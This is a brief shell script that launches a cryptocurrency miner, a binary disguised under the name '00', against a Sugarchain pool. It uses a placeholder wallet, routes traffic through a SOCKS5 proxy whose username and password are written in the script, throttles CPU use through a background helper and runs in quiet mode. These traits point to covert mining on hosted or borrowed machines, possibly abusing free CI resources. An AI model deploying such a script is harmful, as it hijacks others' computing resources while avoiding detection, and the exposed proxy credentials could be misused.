
chmod +x docker limit.sh
./limit.sh 00 65 75 &
POOL=1pool.sugarchain.org:3333
WALLET=masukanwalletsugar.gitlab
PROXY=socks5://woiden_adz:212@sg-socks5.woiden.net:8080
./00 -a yespowerSUGAR -o $POOL -u $WALLET -x $PROXY -q
